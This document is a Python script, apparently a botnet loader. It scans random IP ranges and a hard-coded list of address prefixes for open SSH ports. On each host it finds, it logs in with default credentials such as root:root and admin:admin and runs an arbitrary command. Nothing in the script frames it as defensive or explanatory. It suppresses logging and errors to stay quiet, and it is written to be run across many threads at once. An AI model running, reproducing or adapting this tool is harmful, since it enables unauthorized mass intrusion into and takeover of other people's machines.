import sys
import time
import random
import socket
import paramiko
import warnings
import threading

cmd = "" # Command here

paramiko.util.log_to_file("/dev/null")
warnings.filterwarnings(action="ignore", module=".*paramiko.*")

if len(sys.argv) < 3:
	print("Incorrect usage!")
	print("If choice is butterfly don't include a range")
	sys.exit("Usage: python {} <Threads> <Choice(A/B/C/Butterfly)> <Range>".format(sys.argv[0]))

threads = int(sys.argv[1])
choice = sys.argv[2].lower()

if choice == "a":
	range1 = sys.argv[3]
elif choice == "b":
	range1, range2 = sys.argv[3].split(".")
elif choice == "c":
	range1, range2, range3 = sys.argv[3].split(".")
elif choice != "butterfly":
	sys.exit("This is not an option.")

found = []

credentials = [
	"root:root",
	"admin:admin"
]

butterfly = [
	"5.232",
	"5.232.160",
	"5.238",
	"5.238.40",
	"5.74",
	"5.74.128",
	"5.78"
]

def gen():
	return str(random.randint(0, 255))

def butterflies():
	r = random.choice(butterfly).split(".")
	
	return ".".join(abc for abc in r) + "." + ".".join(gen() for i in range(4-len(r)))

def ipgen():
	if choice == "a":
		return "{}.{}.{}.{}".format(range1, gen(), gen(), gen())
	if choice == "b":
		return "{}.{}.{}.{}".format(range1, range2, gen(), gen())
	if choice == "c":
		return "{}.{}.{}.{}".format(range1, range2, range3, gen())
	if choice == "butterfly":
		return butterflies()

def scan():
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(5)
			
			target = ipgen()
			
			result = sock.connect_ex((target, 22))
			
			if result == 0 and found.count(target) < 1:
				found.append(target)

				username, password = random.choice(credentials).split(":")

				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				ssh.connect(target, port=22, username=username, password=password, timeout=5)

				stdin, stdout, stderr = ssh.exec_command(cmd)

				print("[SSH] Loading - {}@{}:{}".format(username, target, password))
				
				time.sleep(5)
				ssh.close()
			sock.close()
		except:
			pass

for i in range(threads):
	threading.Thread(target=scan, daemon=True).start()

while True:
	try:
		time.sleep(1)
	except KeyboardInterrupt:
		sys.exit("Quitting, bye bye...")
